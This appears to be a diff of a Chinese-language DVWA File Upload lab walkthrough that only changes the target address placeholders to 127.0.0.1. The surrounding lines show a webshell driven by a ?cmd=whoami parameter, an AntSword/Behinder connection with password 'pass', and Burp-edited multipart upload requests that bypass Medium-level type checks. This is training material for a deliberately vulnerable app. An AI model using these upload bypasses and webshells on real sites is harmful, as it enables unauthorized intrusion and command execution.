@@ -32,7 +32,7 @@
 - 难度：Low / Medium
 - 攻击机：Kali Linux
 - 工具：Burp Suite、蚁剑 / 冰蝎、浏览器
-- 靶机地址示例：`http://192.168.1.100/dvwa/`
+- 靶机地址示例：`http://127.0.0.1/dvwa/`
 
 进入 **File Upload** 模块，将安全级别分别设置为 Low 和 Medium。
 
@@ -106,14 +106,14 @@ if (isset($_GET['cmd'])) {
 浏览器访问：
 
 ```text
-http://靶机IP/dvwa/hackable/uploads/shell.php?cmd=whoami
+http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami
 ```
 
 如果返回当前系统用户，说明 WebShell 执行成功。
 
 #### 4\. 使用蚁剑 / 冰蝎连接
 
-- URL：`http://靶机IP/dvwa/hackable/uploads/shell.php`
+- URL：`http://127.0.0.1/dvwa/hackable/uploads/shell.php`
 - 密码：`pass`（对应一句话木马中的 `pass`）
 - 连接成功后即可管理文件、执行命令、反弹 Shell。
 
@@ -123,7 +123,7 @@ http://靶机IP/dvwa/hackable/uploads/shell.php?cmd=whoami
 
 ```http
 POST /dvwa/vulnerabilities/upload/ HTTP/1.1
-Host: 靶机IP
+Host: 127.0.0.1
 Content-Type: multipart/form-data; boundary=...
 
 ------WebKitFormBoundary...
@@ -237,7 +237,7 @@ if (($uploaded_type == "image/jpeg" || $uploaded_type == "image/png") && ($uploa
 5. 转发请求，页面提示上传成功。
 6. 访问：
    ```text
-    http://靶机IP/dvwa/hackable/uploads/shell.php?cmd=whoami
+    http://127.0.0.1/dvwa/hackable/uploads/shell.php?cmd=whoami
    ```
 
 #### 方法二：直接修改文件扩展名（不推荐）
@@ -266,12 +266,12 @@ Content-Type: image/jpeg
 #### 3\. 访问执行
 
 ```text
-http://靶机IP/dvwa/hackable/uploads/shell.php
+http://127.0.0.1/dvwa/hackable/uploads/shell.php
 ```
 
 使用蚁剑连接：
 
-- URL：`http://靶机IP/dvwa/hackable/uploads/shell.php`
+- URL：`http://127.0.0.1/dvwa/hackable/uploads/shell.php`
 - 密码：`pass`
 
 ### Medium Burp 改包
@@ -280,7 +280,7 @@ http://靶机IP/dvwa/hackable/uploads/shell.php
 
 ```http
 POST /dvwa/vulnerabilities/upload/ HTTP/1.1
-Host: 靶机IP
+Host: 127.0.0.1
 Cookie: PHPSESSID=...; security=medium
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC
 
